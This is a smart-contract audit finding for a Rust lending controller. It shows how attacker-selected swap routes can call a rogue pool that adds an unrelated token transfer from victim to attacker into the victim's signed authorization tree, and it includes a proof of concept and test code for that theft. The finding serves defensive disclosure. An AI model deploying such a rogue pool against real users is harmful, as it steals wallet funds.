### Title
Arbitrary route venue can steal unrelated wallet assets through the caller’s authorization tree - (File: contracts/controller/src/strategies/swap.rs)

### Summary
The controller accepts opaque swap-route bytes and invokes the configured router while the user’s `caller` authorization remains active. [1](#0-0)  Although the controller authorizes only an exact controller-to-router input transfer, that protection bounds only the controller’s own contract authority. [2](#0-1)  A route-selected venue can execute arbitrary contract code below the user-authorized strategy call and request an unrelated `token.transfer(victim, attacker, amount)`. [3](#0-2)  Simulation records that transfer as a child of the victim’s `swap_collateral` authorization; if the victim signs the returned authorization tree, the theft executes even though the swap itself produces fair output and leaves the account solvent. [4](#0-3) 

### Finding Description
`swap_collateral` first calls `caller.require_auth()` and verifies that the caller owns or delegates the target account. [5](#0-4)  It then withdraws collateral and reaches `swap_tokens`, which snapshots input/output balances, authorizes only `token_in.transfer(controller, router, amount_in)`, and calls `router.execute_strategy(controller, amount_in, swap)` with attacker-supplied route bytes. [6](#0-5) 

The controller’s post-checks are limited to controller balance deltas: input cannot grow, measured spend cannot exceed `amount_in`, unused controller-held input is refunded, and positive output is required. [7](#0-6)  These checks do not prevent route-selected code from making a separate authorization request against the original user while the user-authorized call stack is active. The authorization-tree test demonstrates that a pool selected by route payload can call an unrelated token’s `transfer(victim, attacker, amount)`, that honest simulation nests that theft under the victim’s `swap_collateral` entry, and that signing the simulated tree completes both the fair protocol swap and the wallet theft. [8](#0-7) 

The same trust boundary applies to the other controller strategies that pass user-controlled route bytes into `swap_tokens`: `multiply`, `swap_debt`, and `repay_debt_with_collateral`.

### Impact Explanation
An attacker can craft a swap route that preserves the expected lending operation while causing simulation to request authority for an unrelated token transfer from the victim to the attacker. If the victim signs the simulated tree without recognizing the added child invocation, the transaction steals wallet assets outside the protocol’s collateral and debt accounting. The protocol swap can still satisfy measured-output and final risk checks, so the loss is not bounded by the routed collateral amount. [9](#0-8) 

This is theft of user funds rather than a mere bad exchange rate: the demonstrated stolen token was unrelated to the supplied collateral, and the victim received the fair swap output while losing the entire tested wallet balance. [10](#0-9) [11](#0-10) 

### Likelihood Explanation
A successful attack requires the victim to execute an attacker-influenced route and sign an authorization tree containing the additional token transfer. It does not require privileged access, leaked keys, compromised protocol administration, oracle manipulation, or control of the user’s lending account. The tested path uses the ordinary unprivileged `swap_collateral` flow, and enforcement-mode testing confirms that signing the poisoned tree is sufficient for the unrelated transfer to execute. [12](#0-11) 

The likelihood is constrained by wallet/client authorization review: an honest signature over only the expected call tree rejects the malicious transfer. [13](#0-12)  However, route bytes are opaque to the controller and venue addresses are selected by payload, so users cannot rely on the controller’s balance checks to reveal the extra authorization request.

### Recommendation
Restrict executable swap routes to governance-approved venue contracts or pool addresses rather than accepting arbitrary route-selected contracts. If broad venue support is required, introduce an explicit signed-route manifest or route hash committed by the caller and enforce a whitelist at the controller/router boundary.

At the integration layer, reject any `swap_collateral`, `swap_debt`, `multiply`, or `repay_debt_with_collateral` authorization tree that contains children beyond the expected protocol token pulls. The current controller-side invariant intentionally binds only the controller’s exact router input transfer and does not bound unrelated user-authorization children introduced deeper in the call. [14](#0-13) 

### Proof of Concept
1. Victim supplies `10,000 USDC` and holds `WALLET_BALANCE` of an unrelated token.
2. Attacker deploys a route-compatible pool whose `swap` function calls:
   `wallet_token.transfer(victim, attacker, WALLET_BALANCE)`.
3. Victim calls `swap_collateral(caller=victim, account_id=victim_account, current=USDC, amount=5,000 USDC, new=ETH, swap=malicious_route)`.
4. The controller authorizes only its exact `USDC.transfer(controller, router, amount)` and invokes `execute_strategy`.
5. The malicious pool performs `wallet_token.transfer(victim, attacker, WALLET_BALANCE)`.
6. Transaction simulation returns a `swap_collateral` authorization entry with that unrelated wallet transfer as a child.
7. If the victim signs that returned tree, the transaction succeeds: the victim receives fair `ETH` collateral output but loses all `WALLET_BALANCE` to the attacker.

### Citations

**File:** contracts/controller/src/strategies/swap.rs (L24-38)
```rust
    let controller = env.current_contract_address();
    let router_addr = storage::get_swap_aggregator(env);
    let router = SwapAggregatorClient::new(env, &router_addr);
    let token_in_client = token::Client::new(env, token_in);

    // Snapshot before router execution to measure its spend and output.
    let in_before = token_in_client.balance(&controller);
    let out_before = token::Client::new(env, token_out).balance(&controller);

    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });
```

**File:** contracts/controller/src/strategies/swap.rs (L40-55)
```rust
    // Reject input gains or overspending; refund only this swap's unused input.
    let in_after = token_in_client.balance(&controller);
    assert_with_error!(env, in_after <= in_before, StrategyError::RouterOverspend);
    let actual_spent = in_before - in_after;
    assert_with_error!(
        env,
        actual_spent <= amount_in,
        StrategyError::RouterOverspend
    );
    let leftover = amount_in - actual_spent;
    if leftover > 0 {
        token_in_client.transfer(&controller, refund_to, &leftover);
    }

    verify_router_output(env, token_out, out_before)
}
```

**File:** common/src/token.rs (L33-51)
```rust
/// Authorizes, on behalf of the current contract, one `transfer(from, to, amount)`
/// call on `token_addr` made deeper in the next contract call (for example by
/// the pool). The entry allows no further sub-invocations.
pub fn authorize_transfer_as_current(
    env: &Env,
    token_addr: &Address,
    from: &Address,
    to: &Address,
    amount: i128,
) {
    let entry = InvokerContractAuthEntry::Contract(SubContractInvocation {
        context: ContractContext {
            contract: token_addr.clone(),
            fn_name: symbol_short!("transfer"),
            args: (from.clone(), to.clone(), amount).into_val(env),
        },
        sub_invocations: Vec::new(env),
    });
    env.authorize_as_current_contract(vec![env, entry]);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L39-70)
```rust
    pub fn execute_strategy(env: Env, sender: Address, total_in: i128, swap_xdr: Bytes) -> i128 {
        sender.require_auth();
        let route = RoutedSwap::from_xdr(&env, &swap_xdr).expect("route must decode");
        let router = env.current_contract_address();
        token::Client::new(&env, &route.token_in).transfer(&sender, &router, &total_in);
        let _: Val = env.invoke_contract(&route.hop_pool, &symbol_short!("swap"), vec![&env]);
        token::Client::new(&env, &route.token_out).transfer(&router, &sender, &route.min_out);
        route.min_out
    }
}

/// Attacker-deployed "pool". `amount == 0` is the benign control.
#[contract]
pub struct RogueHopPool;

#[contractimpl]
impl RogueHopPool {
    pub fn __constructor(env: Env, victim: Address, token: Address, to: Address, amount: i128) {
        env.storage()
            .instance()
            .set(&symbol_short!("PLAN"), &(victim, token, to, amount));
    }

    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L83-90)
```rust
    /// Debt-free Alice with 10 000 USDC supplied and an unrelated token in her wallet.
    fn new() -> Self {
        let mut t = LendingTest::new().standard_two_asset().build();
        t.supply(ALICE, "USDC", 10_000.0);
        let alice = t.get_or_create_user(ALICE);
        let account_id = t.resolve_account_id(ALICE);

        let router = t.env.register(UnlistedPoolRouter, ());
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L194-269)
```rust
#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
}

#[test]
fn enforced_auth_moves_the_wallet_token_only_when_the_signed_tree_lists_the_rogue_transfer() {
    let s = Scene::new();

    // Control: a pool that touches nothing passes with the honest root-only tree.
    let benign = s.route_through_pool_stealing(0);
    s.try_swap_with_signed_tree(&benign, &[])
        .expect("the honest tree authorizes an honest route");
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);

    // Rogue pool, honest tree: the host refuses the transfer and the whole call rolls back.
    s.t.env.mock_all_auths_allowing_non_root_auth();
    let rogue = s.route_through_pool_stealing(WALLET_BALANCE);
    let usdc_before = s.t.supply_balance_raw(ALICE, "USDC");
    let refused = s
        .try_swap_with_signed_tree(&rogue, &[])
        .expect_err("a transfer outside the signed tree is unauthorized");
    std::println!("rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
    );
    assert!(s
        .diagnostics()
        .contains("Unauthorized function call for address"));
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);
    assert_eq!(s.wallet(&s.attacker), 0);
    assert_eq!(s.t.supply_balance_raw(ALICE, "USDC"), usdc_before);

    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
}
```

**File:** contracts/controller/src/strategies/swap_collateral.rs (L40-48)
```rust
    require_authorized_caller(env, caller);

    assert_with_error!(env, current != new, GenericError::AssetsAreTheSame);
    config::require_hub_active(env, current.hub_id);
    require_positive_amount(env, from_amount);

    let mut account = storage::get_account(env, account_id);
    account::require_owner_or_delegate(env, account_id, caller, &account.owner);
    let mut cache = Context::new(env);
```

**File:** docs/reference/invariants.md (L632-640)
```markdown
### INV-STRAT-01 — Controller router authority binds one input transfer

The controller authorizes one exact
`token_in.transfer(controller, configured_router, amount_in)` invocation,
without sub-invocations. This grants invocation authority, without a token
allowance.

The controller ignores the router's return value, rejects input-balance growth
and rejects measured spending above `amount_in`.
```
